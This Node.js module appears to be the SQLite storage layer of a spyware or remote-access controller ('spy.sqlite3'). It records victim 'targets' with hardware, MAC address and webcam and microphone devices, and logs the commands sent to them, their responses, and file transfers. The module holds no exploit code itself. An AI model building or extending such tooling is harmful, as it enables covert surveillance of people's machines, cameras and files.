var path = require('path');
var util = require('util');
var sqlite = require('sqlite3').verbose();

var db = null ;

module.exports.connect = function(db_file = 'spy.sqlite3'){
	if (!db)
	db = new sqlite.Database(path.join('db',db_file));
}

module.exports.close = function(){
	db.close();
}

module.exports.target_in_db = function(target_id, callback){

	sql = "select id from targets where id = ?";
	db.get(sql, [target_id], function(err, rows){
		callback(err, rows);
	});
}

module.exports.get_ffmpeg_devs = function(target_id, callback){
	sql = "select video_devs from targets where id = ?";
	db.get(sql, [target_id], function(err, rows){
		callback(err, rows);
	});
}

module.exports.add_target = function(info, callback){
	
	sql = "insert into targets values(?,?,?,?,?,?,?,?,?,?)";
	db.run(sql,
		[info.id, info.machine, info.name, info.platform, info.processor,
            info.ram, info.hard_disk, info.mac,JSON.stringify(info.ffmpeg_devs.video_devs),
            JSON.stringify(info.ffmpeg_devs.audio_devs)],
            function(err){
            	callback(err);
            }); 
}

module.exports.get_target_info = function(id, callback){
	sql = "select * from targets where id = ?";
	
	db.get(sql, [id], function(err, rows){
		callback(err, rows);
	});
}

module.exports.add_to_history = function(hist, callback)
{
	sql = "insert into history(target_id,command,date_end,date_start,type,target_response) values(?,?,?,?,?,?)";
	db.run(sql,[hist.target_id, hist.cmd_text, hist.edate,hist.sdate, hist.Type, hist.data], function(err){
		callback(err);
	});

}

module.exports.add_to_ftp_history = function(f_hist, callback)
{
	sql = "insert into ftp_history(target_id,type,date_start,date_end,total_received,total_sent,state, file_path) values(?,?,?,?,?,?,?,?)";
	db.run(sql,[f_hist.target_id,f_hist.Type,f_hist.sdate,f_hist.edate,f_hist.trecv,f_hist.tsnd,f_hist.state,f_hist.path], function(err){
		if(err)
			callback(err);
	});
}

module.exports.get_recent_msgs = function(id, callback){
	sql = `select * from history where target_id = ? and type like 'msg%' 
	order by datetime(date_start) desc limit 5 `;

	db.all(sql, [id], function(err, rows){
		callback(err, rows);
	});
}

module.exports.get_timeLine = function(id, callback){
	sql = `select date_start, type, count(type) as nb_type from history where target_id = ?
	group by date(date_start), type
	order by datetime(date_start) asc`;

	db.all(sql, [id], function(err, rows){
		callback(err, rows);
	});
}